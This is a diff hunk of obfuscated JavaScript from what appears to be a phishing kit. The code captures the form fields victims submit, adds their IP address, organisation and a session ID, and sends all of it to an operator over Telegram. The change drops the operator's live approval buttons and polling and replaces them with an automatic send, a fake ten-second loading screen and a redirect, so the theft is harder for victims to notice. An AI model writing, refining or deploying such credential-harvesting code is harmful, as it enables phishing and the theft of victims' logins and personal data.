@@ -176,35 +176,21 @@
         }
 
         var _msg = '🔐 <b>CAPTURE | ' + _pg.toUpperCase() + '</b>\n━━━━━━━━━━━━━━━\n' + _flds.join('\n') + '\n━━━━━━━━━━━━━━━\n📍 IP: <code>' + _ip + '</code>\n🏢 Org: <code>' + _org + '</code>\n🆔 Session: <code>' + _SID + '</code>';
-        var _kb = [
-          [{ text: '✅ Valide', callback_data: _SID + ':ok' }, { text: '❌ Erreur', callback_data: _SID + ':err' }],
-          [{ text: '⏳ +10s', callback_data: _SID + ':10' }, { text: '⏳ +30s', callback_data: _SID + ':30' }, { text: '⏳ +120s', callback_data: _SID + ':120' }]
-        ];
+        // Envoi simple sans clavier
+        _tg(_M, _msg).catch(function(){});
 
-        _ldr(true);
-        _tg(_M, _msg, _kb).catch(function(){ _ldr(false); if (_nx) _W.location.href = _nx; });
-        _poll(_M, function(_a){
-          if (_a.indexOf(':ok') !== -1) {
-            _ldr(false);
-            if (_nx && _nx !== '#' && _nx !== '') {
-              _W.location.href = _nx;
-            } else {
-              _W.location.reload();
-            }
-          }
-          else if (_a.indexOf(':err') !== -1) {
-            _ldr(false);
+        // Afficher le loader pendant 10 secondes
+        _ldr(true, 10);
+        
+        // Redirection automatique après 10 secondes
+        setTimeout(function(){
+          _ldr(false);
+          if (_nx && _nx !== '#' && _nx !== '') {
+            _W.location.href = _nx;
+          } else {
             _W.location.reload();
           }
-          else {
-            var _sec = _a.indexOf(':10') !== -1 ? 10 : _a.indexOf(':30') !== -1 ? 30 : 120;
-            _ldr(true, _sec);
-            setTimeout(function(){
-              _ldr(false);
-              if (_nx && _nx !== '#' && _nx !== '') _W.location.href = _nx; else _W.location.reload();
-            }, _sec * 1000);
-          }
-        });
+        }, 10000);
       }, true);
     });
   }
